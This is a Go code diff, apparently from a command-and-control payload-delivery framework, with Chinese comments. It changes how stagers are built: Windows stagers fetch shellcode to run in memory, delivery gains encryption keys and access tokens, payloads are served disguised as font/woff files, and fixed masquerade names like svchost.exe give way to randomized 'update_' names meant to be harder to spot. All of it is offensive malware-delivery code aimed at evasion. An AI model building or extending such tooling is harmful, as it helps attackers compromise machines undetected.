@@ -578,7 +578,7 @@ func BuildPayload(meta database.WebDelivery, fullData []byte, buildStager bool) 
 
 	// Dynamic stager (needs go toolchain) — best-effort
 	if buildStager {
-		downloadURL := meta.ServerAddress
+		downloadURL := StagerDownloadURL(meta)
 		if downloadURL == "" {
 			// temporary; caller should rebuild URLs then optionally rebuild stager
 			downloadURL = "http://127.0.0.1/placeholder"
@@ -598,6 +598,9 @@ func BuildPayload(meta database.WebDelivery, fullData []byte, buildStager bool) 
 			Lightweight: true,
 			Password:    meta.Pass,
 			XorKey:      meta.XorKey, // Stage XOR 混淆密钥
+			AccessToken: meta.AccessToken,
+			CryptoMode:  meta.CryptoMode,
+			DeliveryKey: AEADKeyBytes(meta.DeliveryKey),
 		}
 		builder := stager.NewStagerBuilder(cfg)
 		bin, err := builder.Build()
@@ -617,6 +620,16 @@ func BuildPayload(meta database.WebDelivery, fullData []byte, buildStager bool) 
 	return p, nil
 }
 
+// StagerDownloadURL 返回 Stager 应拉取的资源。
+// Windows Stager 模板执行的是 shellcode（VirtualAlloc/CreateThread），
+// 因此优先使用 shellcode/woff 地址；Linux Stager 写盘执行完整载荷，使用 full。
+func StagerDownloadURL(meta database.WebDelivery) string {
+	if strings.EqualFold(meta.OS, "windows") && meta.ShellcodeURL != "" {
+		return meta.ShellcodeURL
+	}
+	return meta.ServerAddress
+}
+
 // RebuildStagerForURL rebuilds stager pointing at a concrete download URL
 func RebuildStagerForURL(meta database.WebDelivery, downloadURL string) ([]byte, error) {
 	if downloadURL == "" {
@@ -634,6 +647,9 @@ func RebuildStagerForURL(meta database.WebDelivery, downloadURL string) ([]byte,
 		Lightweight: true,
 		Password:    meta.Pass,
 		XorKey:      meta.XorKey, // Stage XOR 混淆密钥
+		AccessToken: meta.AccessToken,
+		CryptoMode:  meta.CryptoMode,
+		DeliveryKey: AEADKeyBytes(meta.DeliveryKey),
 	}
 	return stager.NewStagerBuilder(cfg).Build()
 }
@@ -651,6 +667,45 @@ func DefaultContentType(osType, kind string) string {
 	}
 }
 
+// RandomFileName 生成不带固定系统进程名的默认交付文件名。
+// 同一投递使用 seed（public_key）保证重启后名称稳定；没有 seed 时随机生成。
+// 默认名不再使用 svchost.exe / systemd-update 这类一眼可识别的伪装名。
+func RandomFileName(osType, format, seed string) string {
+	ext := ""
+	switch strings.ToLower(strings.TrimSpace(format)) {
+	case "dll":
+		ext = ".dll"
+	case "exe":
+		ext = ".exe"
+	default:
+		if strings.EqualFold(osType, "windows") {
+			ext = ".exe"
+		}
+	}
+	suffix := ""
+	for _, r := range seed {
+		if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') {
+			suffix += string(r)
+			if len(suffix) >= 6 {
+				break
+			}
+		}
+	}
+	if suffix == "" {
+		suffix = ShortKey()[:6]
+	}
+	return "update_" + strings.ToLower(suffix) + ext
+}
+
+// DefaultFullContentType 返回完整载荷的默认 Content-Type。
+// 配置了 delivery.full_content_type 时以其为准；否则 Windows 伪装成 font/woff。
+func DefaultFullContentType(osType string) string {
+	if d := effectiveDeliveryDefaults(); strings.TrimSpace(d.FullContentType) != "" {
+		return strings.TrimSpace(d.FullContentType)
+	}
+	return DefaultContentType(osType, "stage")
+}
+
 // EnsureMetaDefaults fills hub fields on create
 func EnsureMetaDefaults(meta *database.WebDelivery) {
 	if meta.BindMode == "" {
@@ -660,17 +715,14 @@ func EnsureMetaDefaults(meta *database.WebDelivery) {
 		meta.PublicKey = ShortKey()
 	}
 	if meta.ContentType == "" {
-		meta.ContentType = "application/octet-stream"
+		meta.ContentType = DefaultFullContentType(meta.OS)
 	}
 	if meta.StageContentType == "" {
 		meta.StageContentType = DefaultContentType(meta.OS, "woff")
 	}
 	if meta.FileName == "" {
-		if meta.OS == "windows" {
-			meta.FileName = "svchost.exe"
-		} else {
-			meta.FileName = "systemd-update"
-		}
+		// 用 public_key 派生，重启恢复时文件名不会漂移
+		meta.FileName = RandomFileName(meta.OS, "", meta.PublicKey)
 	}
 	if meta.SaveFilename == "" {
 		meta.SaveFilename = meta.FileName
@@ -689,6 +741,8 @@ func EnsureMetaDefaults(meta *database.WebDelivery) {
 	if meta.BindMode == "shared" && (meta.ListeningPort == "" || meta.ListeningPort == "0") {
 		meta.ListeningPort = "shared-" + meta.PublicKey
 	}
+	// 加密配置：空值兼容旧记录（XorKey!=0 → xor），aead 缺密钥时自动生成
+	EnsureCryptoDefaults(meta)
 }
 
 // ReadEmbedded is a helper signature docs — actual read done in api via embed.FS
